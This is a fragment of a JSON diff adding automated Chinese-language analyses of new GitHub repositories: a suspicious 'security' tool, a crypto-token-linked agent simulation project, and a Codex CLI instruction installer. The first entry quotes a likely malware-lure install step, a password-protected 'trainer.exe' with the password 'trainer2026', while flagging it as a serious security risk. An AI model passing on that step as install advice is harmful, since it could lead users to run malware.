+            "按 `INSERT` (或 `F1`) 键打开菜单并启用功能。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "README结构清晰，但项目语言为Python，而安装指南却指向下载`trainer.exe`，并需使用`trainer2026`密码解压。这种下载和运行方式对于一个数据安全工具来说极不寻常且存在巨大安全隐患，严重降低信任度。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue 和 PR 均为 0。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-07-01T06:12:44.034Z"
+    },
+    {
+      "owner": "TianhangZhuzth",
+      "repo": "Fundamental-Ava",
+      "fullName": "TianhangZhuzth/Fundamental-Ava",
+      "description": "Build digital human beings — autonomous, collaborative, and socially intelligent agents. FNzgGxU31RWiDgLr3GvxxSa42nRntvZNSG6aBMQ1pump",
+      "language": "Python",
+      "topics": [
+        "ai",
+        "ai-agents"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-30T01:04:13Z",
+      "url": "https://github.com/TianhangZhuzth/Fundamental-Ava",
+      "analysis": {
+        "positioning": "构建并模拟大规模自主、协作、社会化智能的数字生命群体。",
+        "useCases": [
+          "你希望研究多智能体系统 → 它能帮你模拟数字生命群体的社会涌现行为。",
+          "你正在设计AI智能体间的复杂交互实验 → 它能帮你观察自主智能体间的协作、关系与规范形成。",
+          "你探索宏观文明级现象如何从简单个体行为中涌现 → 它能让你通过构建简单智能体规则来检测和测量这些现象。"
+        ],
+        "audience": "AI研究者、开发者以及对多智能体系统、数字社会涌现行为感兴趣的探索者。",
+        "quickStart": {
+          "prerequisites": "Python 3.11+",
+          "steps": [
+            "安装 Ava 库（通过 pip 或克隆仓库）。",
+            "定义继承自 `AgentCore` 的智能体类，实现 `deliberate` 方法来决定智能体行为。",
+            "创建 `Civilization` 实例，配置模拟参数，并添加自定义智能体。",
+            "运行 `civ.run()` 启动模拟，获取智能体群体行为报告。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Stanford Generative Agents",
+            "method": "研究项目，模拟25个AI智能体社区的行为涌现。",
+            "models": "N/A (研究特定)",
+            "pricing": "N/A (研究特定)"
+          },
+          {
+            "name": "AI Digital Human Group's Project SID",
+            "method": "研究项目，探索千智能体社会的复杂行为。",
+            "models": "N/A (研究特定)",
+            "pricing": "N/A (研究特定)"
+          }
+        ],
+        "pricing": "代码开源免费（Apache-2.0），但其核心功能和生态可能由 `$AVA` 代币驱动。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目愿景宏大，README 专业且详尽，由 Fundamental Research Labs 支持，代码质量有徽章保障。但Issue数为0，社区活跃度尚不明朗，且项目与加密货币 `$AVA` 绑定，存在额外的商业和投机考量，可能影响纯技术社区的接受度。",
+        "isVibeCoding": true,
+        "communityActivity": "仓库目前无Issue记录，社区活跃度尚不明朗，可能处于早期阶段或主要通过其他渠道沟通。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-01T06:13:11.288Z"
+    },
+    {
+      "owner": "Jia-Ethan",
+      "repo": "codex-keysmith",
+      "fullName": "Jia-Ethan/codex-keysmith",
+      "description": "Codex CLI instruction-file installer for local configuration",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-28T04:38:07Z",
+      "url": "https://github.com/Jia-Ethan/codex-keysmith",
+      "analysis": {
+        "positioning": "Codex CLI本地指令文件安全安装器，简化配置流程。",
+        "useCases": [
+          "你手动复制指令文件、编辑配置、备份麻烦 → 它帮你一键安全安装本地Markdown指令文件到Codex CLI。",
+          "你担心直接修改配置出错 → 它提供预览、备份和确认机制，确保操作无风险。",
+          "你希望快速切换不同指令文件进行测试 → 它让你通过参数轻松部署和管理自定义指令。"
+        ],
+        "audience": "Codex CLI开发者和高级用户，需本地化管理和测试AI指令集。",
+        "quickStart": {
+          "prerequisites": "Python 3.8+",
+          "steps": [
+            "克隆或下载项目代码。",
+            "运行 `python3 codex-instruct.py --dry-run` 预览修改。",
+            "确认后，运行 `python3 codex-instruct.py --codex-dir ~/.codex --yes` 安装。"
+          ],
+          "note": "安装后需重启Codex CLI生效。"
+        },
+        "competitors": [],
+        "pricing": "免费 (MIT License)",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "功能明确且切中痛点，文档详尽，注重操作安全性，项目维护良好。",
+        "isVibeCoding": true,
+        "communityActivity": "GitHub Issue为零，但项目明确引导至LINUX DO社区获取反馈和监督。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-07-01T06:13:34.687Z"
     }
   ]
 }
